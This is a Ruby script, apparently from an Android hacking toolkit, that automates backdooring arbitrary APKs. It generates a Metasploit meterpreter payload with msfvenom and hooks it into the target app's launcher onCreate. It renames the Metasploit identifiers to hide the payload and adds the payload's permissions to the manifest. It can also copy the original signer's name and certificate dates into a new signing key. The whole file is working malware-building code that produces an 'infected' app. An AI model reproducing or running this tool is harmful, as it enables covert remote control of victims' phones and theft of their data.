#!/usr/bin/env ruby
# This script automatice the injections of metasploit payloads on arbitrary APKs.
# The APKs file have to be vulnerable without unicode files.

require 'nokogiri'
require 'fileutils'
require 'optparse'
require 'open3'
require 'date'
require 'active_support'
require 'active_support/core_ext/object/blank'

class String
  def colorize(color_code)
    $stderr.isatty ? "\033[#{color_code}m#{self}\033[0m" : self
  end

  def black;          colorize(30) end
  def red;            colorize(31) end
  def green;          colorize(32) end
  def brown;          colorize(33) end
  def blue;           colorize(34) end
  def magenta;        colorize(35) end
  def cyan;           colorize(36) end
  def gray;           colorize(37) end
end

keystore = "signing.keystore"
storepass = "android"
keypass = "android"
keyalias = "signing.key"

def print_status(msg='')
  $stderr.puts "[*]─➤ #{msg}".cyan
end

def print_error(msg='')
  $stderr.puts "[E]─➤ #{msg}".red," 
[?]─➤ For help going to https://t.me/Ivam3_Bot".green
end

def run_cmd(cmd)
  stdout, stderr, status = Open3.capture3(*cmd)
  unless status.success?
    # Log the error or handle it as needed
    # For example, you might want to print stderr to the console
    print_error("Command failed: #{cmd.join(' ')}")
    print_error("STDERR: #{stderr}")
  end
  return stdout, stderr, status
end

def banner()
  banner_output, _, _ = run_cmd(['bash', '.IbyC/embed'])
  puts banner_output
end
  
def usage()
  print "[Usage]─➤ ".cyan,"embed [target.apk] [msfvenom options]\n"
  print "[ex]─➤ ".green,"embed anyapp.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443"
end

#
# Find the activity that apk_backdoor.rb is opened when you click the app icon
def findlauncheractivity(amanifest)
    amanifest.remove_namespaces!
    package_node = amanifest.xpath("//manifest").first
    if package_node.nil?
      raise "Couldn't find node <manifest> in AndroidManifest.xml"
    end
    package = package_node["package"]
# COMMENT LINE TO ADD IA SOLUTION
#    package = amanifest.xpath("//manifest").first['package']

    # First, try the reliable aapt method
    stdout, _, status = run_cmd(["aapt", "dump", "badging", "original.apk"])
    if status.success?
        match = stdout.match(/launchable-activity: name='([^']+)'/)
        if match && match[1]
            return match[1]
        end
    end

    # Fallback to parsing the manifest if aapt fails or doesn't find the activity
    activities = amanifest.xpath("//activity|//activity-alias")
    activities.each do |activity|
        activity.xpath(".//category[@android:name='android.intent.category.LAUNCHER']").each do
            activity_name = activity.attribute('name').to_s
            unless activity_name.start_with?(package)
                activity_name = package + activity_name
            end
            return activity_name
        end
    end

    # Return nil if no launcher activity is found
    nil
end


#
# If XML parsing of the manifest fails,
# recursively search the smali code for the onCreate() hook.
def scrapeFilesForLauncherActivity()
    smali_files = Dir.glob('original/smali*/**/*.smali').select do |file|
        File.read(file).include?(';->onCreate(Landroid/os/Bundle;)V')
    end

    if smali_files.empty?
        raise "No smali files with onCreate found. Cannot proceed with manual hook selection."
    end

    print_status "Please choose from one of the following hook points:"
    smali_files.each_with_index do |s_file, i|
        print_status "#{i}: #{s_file}".green
    end

    hook = -1
    loop do
        print "Hook: "
        input = STDIN.gets.chomp
        if input.match?(/^\d+$/)
            hook = input.to_i
            break if hook >= 0 && hook < smali_files.length
        end
        print_error "Invalid selection. Please enter a number between 0 and #{smali_files.length - 1}."
    end

    smalifile = smali_files[hook]
    activitysmali = File.read(smalifile)

    return [smalifile, activitysmali]
end

def fix_manifest(minSDKv)
  payload_permissions = []

  # Load payload's permissions
  File.open("payload/AndroidManifest.xml", "r") do |file|
    payload_manifest = Nokogiri::XML(file)
    permissions = payload_manifest.xpath("//manifest/uses-permission")
    permissions.each do |permission|
      payload_permissions << permission.attribute("name").to_s
    end
  end

  # Load original apk's manifest
  original_manifest_path = "original/AndroidManifest.xml"
  original_manifest = Nokogiri::XML(File.read(original_manifest_path))
  original_permissions = original_manifest.xpath("//manifest/uses-permission").map { |p| p.attribute("name").to_s }

  # Get permissions that are not in original APK
  add_permissions = payload_permissions - original_permissions

  # Inject permissions in original APK's manifest
  manifest_node = original_manifest.at_xpath("//manifest")
  add_permissions.each do |permission|
    print "
    [+]─➤ Adding ".green,"#{permission}"
    new_permission = Nokogiri::XML::Node.new "uses-permission", original_manifest
    new_permission["android:name"] = permission
    manifest_node.add_child(new_permission)
  end

  # Update or add uses-sdk
  uses_sdk_node = original_manifest.at_xpath("//uses-sdk")
  if uses_sdk_node
    uses_sdk_node["android:minSdkVersion"] = minSDKv
  else
    new_sdk_node = Nokogiri::XML::Node.new "uses-sdk", original_manifest
    new_sdk_node["android:minSdkVersion"] = minSDKv
    manifest_node.add_child(new_sdk_node)
  end

  File.open(original_manifest_path, "w") { |file| file.puts original_manifest.to_xml }
  `sed "s|minSdkVersion: '[0-9][0-9]'|minSdkVersion: '#{minSDKv}'|g" -i original/apktool.yml`
end

def extract_cert_data_from_apk_file(path)
  orig_cert_data = []
  print_status("Get minimum SDK versiom from #{path}")
  # extract signing scheme v1 (JAR signing) certificate
  # v1 signing is optional to support older versions of Android (pre Android 11)
  # https://source.android.com/security/apksigning/
  print_status "Extract signing key and keystore from #{path}.."
  stdout, stderr, status = run_cmd(['keytool', '-J-Duser.language=en', '-printcert', '-jarfile', path])
  keytool_output = stdout + stderr

  if !status.success? && keytool_output.include?('keytool error:')
    raise RuntimeError, "keytool could not parse APK file: #{keytool_output}"
  end

  if keytool_output.start_with?('Not a signed jar file')
    # apk file does not have a valid v1 signing certificate
    # extract signing certificate from newer signing schemes (v2/v3/v4/...) using apksigner instead
    stdout, stderr, status = run_cmd(['apksigner', 'verify', '--print-certs', path])
    apksigner_output = stdout + stderr

    cert_dname = apksigner_output.scan(/^Signer #\d+ certificate DN: (.+)$/).flatten.first.to_s.strip
    if cert_dname.blank?
      raise RuntimeError, "Could not extract signing certificate owner: #{apksigner_output}"
    end
    orig_cert_data.push(cert_dname)
    # Create random start date from some time in the past 3 years
    from_date = DateTime.now.next_day(-rand(3 * 365))
    orig_cert_data.push(from_date.strftime('%Y/%m/%d %T'))

    # Valid for 25 years
    # https://developer.android.com/studio/publish/app-signing
    to_date = from_date.next_year(25)
    validity = (to_date - from_date).to_i
    orig_cert_data.push(validity.to_s)
  else
    if !status.success? && keytool_output.include?('keytool error:')
      raise RuntimeError, "keytool could not parse APK file: #{keytool_output}"
    end

    cert_dname = keytool_output.scan(/^Owner:(.+)$/).flatten.first.to_s.strip
    if cert_dname.blank?
      raise RuntimeError, "Could not extract signing certificate owner: #{keytool_output}"
    end
    orig_cert_data.push(cert_dname)

    valid_from_line = keytool_output.scan(/^Valid from:.+/).flatten.first
    if valid_from_line.empty?
      raise RuntimeError, "Could not extract certificate date: #{keytool_output}"
    end
    from_date_str = valid_from_line.gsub(/^Valid from:/, '').gsub(/until:.+/, '').strip
    to_date_str = valid_from_line.gsub(/^Valid from:.+until:/, '').strip
    from_date = DateTime.parse(from_date_str.to_s)
    orig_cert_data.push(from_date.strftime('%Y/%m/%d %T'))
    to_date = DateTime.parse(to_date_str.to_s)
    validity = (to_date - from_date).to_i
    orig_cert_data.push(validity.to_s)
  end

  if orig_cert_data.empty?
    raise RuntimeError, 'Could not extract signing certificate from APK file'
  end

  orig_cert_data
end

def gen_keystore(apkfile,keystore,storepass,keypass,keyalias)
  orig_cert_data = extract_cert_data_from_apk_file(apkfile)
  orig_cert_dname = orig_cert_data[0]
  orig_cert_startdate = orig_cert_data[1]
  orig_cert_validity = orig_cert_data[2]

  print_status "Creating signing key and keystore.."
  stdout, stderr, status = run_cmd([
    'keytool', '-genkey', '-v', '-keystore', keystore, '-alias', keyalias, '-storepass', storepass,
    '-keypass', keypass, '-keyalg', 'RSA', '-keysize', '2048', '-validity', orig_cert_validity, 
    '-dname', orig_cert_dname
  ])
  keytool_output = stdout + stderr

  if !status.success? && keytool_output.include?('keytool error:')
    raise RuntimeError, "keytool could not generate key: #{keytool_output}"
  end
end

def cleaning_up()
  toClean = ["data","original","payload","original.apk","payload.apk","signing.keystore","*.idsig"]
  for i in toClean do
    run_cmd(['rm', '-rf', i])
  end
end
####
# VALIDATING REQUIREMENTS && DEPENDENCIES
apkfile = ARGV[0]
get_minSDKv=`aapt list -a #{apkfile}|grep "minSdkVersion"|awk -F ")" '{print $NF}'|xargs printf %d`
minSDKv = get_minSDKv.to_s.gsub("\n", "")
stdout, stderr, status = run_cmd(['pwd'])
current_working_directory = stdout
cwd = current_working_directory.to_s
cwd = cwd.gsub("\n", "")
unless(apkfile && File.readable?(apkfile))
  usage()
  exit(1)
end

pkgs = ["jarsigner", "apktool", "zipalign", "java", "apksigner","aapt","keytool","msfvenom", "xml2axml"]
for pkg in pkgs do
  stdout, stderr, status = run_cmd(["which", pkg])
  unless(status.success?)
    print_error("#{pkg} is not in PATH, please install it")
    exit(1)
  end
end

begin
  msfvenom_opts = ARGV[1,ARGV.length]
  opts=""
  msfvenom_opts.each{|x|
    opts+=x
    opts+=" "
  }
rescue
  usage()
  print_error("Error parsing msfvenom options.")
  exit(1)
end

# Set signer key file || default was maded on nov/2022 with android debugging parameters
cleaning_up()
banner()
print "[?]─➤ Set a keystore signer
{1}─➤ ".cyan,"Using the original apk credentials"," 
{2}─➤ ".cyan,"Using your own key"," 
{3}─➤ ".cyan,"Create a new key"," 
 ╰──➤ ".cyan
answ = $stdin.gets.to_i
if answ<=3 and answ>0
  case answ
  when 2
    print " [Key-path]─➤ ".cyan
    jksfile = $stdin.gets.chomp.to_s
    if File.exist?("#{jksfile}")
      run_cmd(['cp', jksfile, "#{cwd}/key.jks"])
    else
      puts " [ERR-not_found]─➤ Aborting".red
      exit(1)
    end
  when 3
    run_cmd([
      "keytool", "-genkey", "-v", "-keystore", "userkey.jks", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-alias", keyalias
    ])
    FileUtils.cp("userkey.jks",keystore)
  else
    gen_keystore(apkfile,keystore,storepass,keypass,keyalias)
  end
else
  puts " [ERR-bad_answer]─➤ Aborting.".red
  exit(1)
end

print_status("Generating msfvenom payload..")
stdout, stderr, status = run_cmd(['msfvenom', '-f', 'raw', *msfvenom_opts, '-o', 'payload.apk'])
res = stdout + stderr
if !status.success? || res.downcase.include?("invalid") || res.downcase.include?("error")
  puts res
  exit(1)
end

print_status("Signing payload..")
stdout, stderr, status = run_cmd(['apksigner', 'sign', '--ks', keystore, '--ks-pass', "pass:#{storepass}", "#{cwd}/payload.apk"])
unless status.success?
  cleaning_up()
  raise RuntimeError, "Unable to sign payload.apk"
end

run_cmd(["cp", apkfile, "#{cwd}/original.apk"])

print_status("Decompiling orignal APK..")
run_cmd(["apktool", "d", "-f", "-r", "-o", "#{cwd}/original", "#{cwd}/original.apk"])

print_status("Decompiling AndroidManifest..")
FileUtils.cp Dir.glob("#{cwd}/original/AndroidManifest.xml"), "#{cwd}/"
FileUtils.rm_rf("#{cwd}/original/AndroidManifest.xml")
run_cmd(['xml2axml', 'd', "#{cwd}/AndroidManifest.xml", "#{cwd}/original/AndroidManifest.xml"])
FileUtils.rm_rf("#{cwd}/AndroidManifest.xml")
# print_status("Ignoring the resource decompilation..")
# run_cmd(["apktool", "d", "-f", "-o", "#{cwd}/original_tmp", "#{cwd}/original.apk"])
# FileUtils.rm_rf('original/apktool.yml')
# FileUtils.cp Dir.glob('original_tmp/apktool.yml'), 'original/'
# FileUtils.rm_rf('original/AndroidManifest.xml')
# FileUtils.cp Dir.glob('original_tmp/AndroidManifest.xml'), 'original/'
# FileUtils.rm_rf('original_tmp')
print_status("Decompiling payload APK..")
run_cmd(['apktool', 'd', '-f', '-o', "#{cwd}/payload", "#{cwd}/payload.apk"])
f = File.open("original/AndroidManifest.xml")
amanifest = Nokogiri::XML(f)
f.close

print_status("Locating onCreate() hook..")
launcheractivity = findlauncheractivity(amanifest)
smali_path = launcheractivity.gsub(/\./, "/") + ".smali"
matches = Dir.glob("original/**/*#{smali_path}").sort
smalifile = matches.find { |f| f.include?("smali/") } || matches.first

if matches.any?
  smalifile = matches.first
end 

begin
  activitysmali = File.read(smalifile.to_s)
rescue Errno::ENOENT
  puts "[W]─➤ Unable to find correct hook automatically".blue
  begin
    results=scrapeFilesForLauncherActivity()
    smalifile=results[0]
    activitysmali=results[1]
  rescue
    cleaning_up()
    print_error("Couldn't find launcher activity..")
    exit(1)
  end
end

print_status("Copying payload files..")
apk_name=apkfile.split("/")[-1].gsub(".apk", "") 

payload_dir = []
Dir.glob(smalifile) do |path|
  # Extraer la parte hasta "com"
  file = Dir.glob("payload/smali/com/metasploit/stage/Pay*.smali").first
  com_dir = path[%r{^.*?/com}]
  payload_dir = "#{com_dir}/#{apk_name}/stage/"
  FileUtils.mkdir_p(payload_dir)
  FileUtils.mv file, File.join(payload_dir, "#{apk_name}.smali")
end 

print_status("Loading #{smalifile} and injecting payload..")
activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
payloadhook = "#{activitycreate}\n    invoke-static {p0}, Lcom/#{apk_name}/stage/#{apk_name};->start(Landroid/content/Context;)V"
hookedsmali = activitysmali.gsub(activitycreate, payloadhook)

File.open(smalifile, "w") {|file| file.puts hookedsmali }
injected_apk = "data/data/com_backdoored.apk"
final_apk=apkfile.split("/")[-1]
final_apk+="_final"

print_status("Encoding payload..")
File.write(
  "#{payload_dir}#{apk_name}.smali", 
  File.read("#{payload_dir}#{apk_name}.smali").gsub("Payload", "#{apk_name}")
)
File.write(
  "#{payload_dir}#{apk_name}.smali",
  File.read("#{payload_dir}#{apk_name}.smali").gsub("metasploit", "#{apk_name}")
)

print "\n"
print_status("Poisoning the manifest with meterpreter permissions..")
fix_manifest(minSDKv)

print "\n"
print_status("Encoding AndroidManifest file..")
for i in (1..3) do
  stdout, stderr, status = run_cmd(['xml2axml', 'e', "#{cwd}/original/AndroidManifest.xml", "#{cwd}/AndroidManifest.xml"])
  xml2axml_output = stdout + stderr
  FileUtils.rm_rf("#{cwd}/original/AndroidManifest.xml")
  FileUtils.cp Dir.glob("#{cwd}/AndroidManifest.xml"), 'original/'
  FileUtils.rm_rf("#{cwd}/AndroidManifest.xml")
  if !status.success?
    print_error(xml2axml_output)
    cleaning_up()
    raise RuntimeError, "Unable to encode AndroidManifest.. Retrying[#{i}].."
  else 
    break
  end 
end

print_status("Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}..")
for i in (1..3) do
  stdout, stderr, status = run_cmd(['apktool', 'b', '-f', '-o', "#{cwd}/#{injected_apk}", "#{cwd}/original"])
  apktool_output = stdout + stderr
#######= VALIDA SI EL AndroidManifest ESTA CORRUPTO O NO =#############################
  # stdout, stderr, status = run_cmd([
  #   'aapt', 'dump', 'badging', "#{cwd}/#{injected_apk}"
  # ])
  # aapt_dump_output = stdout + stderr
  
  if !status.success?
    print_error(apktool_output)
    cleaning_up()
    raise RuntimeError, "Unable to rebuild.. Retrying[#{i}].."
  # elsif !status.success?
  #   print_error(aapt_dump_output)
  #   cleaning_up()
  #   raise RuntimeError, "AndroidManifest.xml is corrupt.. Retrying[#{i}].."
########= SE COMENTA LA LINEA TEMPORALMENTE PARA PROBAR SOLLUCION #####################
  else
    break
  end
end

print_status("Aligning #{injected_apk}..")
stdout, stderr, status = run_cmd(['zipalign', '-f', '-v', '4', injected_apk, final_apk])
zipalign_output = stdout + stderr

unless File.readable?(final_apk)
  print_error(zipalign_output)
  cleaning_up()
  raise RuntimeError, 'Unable to align apk with zipalign.'
  exit(1)
end

print_status("Signing #{final_apk} with apksigner..")
stdout, stderr, status = run_cmd([
  'apksigner', 'sign', '--ks', keystore, '--ks-pass', "pass:#{storepass}", 
  '--ks-key-alias', keyalias, '--v3-signing-enabled', 'true', '--v4-signing-enabled', 'true',
  '--min-sdk-version', "#{minSDKv}", final_apk
])
apksigner_output = stdout + stderr

if !status.success? || apksigner_output.to_s.include?('Failed')
  print_error(apksigner_output)
  cleaning_up()
  raise RuntimeError, 'Signing with apksigner failed.'
  exit(1)
end

stdout, stderr, status = run_cmd([
  'apksigner', 'verify', '--verbose', 
  '--min-sdk-version', "#{minSDKv}", final_apk
])
apksigner_verify = stdout + stderr

if !status.success? || apksigner_verify.to_s.include?('DOES NOT VERIFY') || apksigner_verify.to_s.include?('Failed')
  print_error(apksigner_verify)
  cleaning_up()
  raise RuntimeError, 'Signature verification failed.'
  exit(1)
else
  # cleaning_up()
  print "[DONE]─➤ Infected file is ready in: ".green,"#{cwd}/#{final_apk}."
end
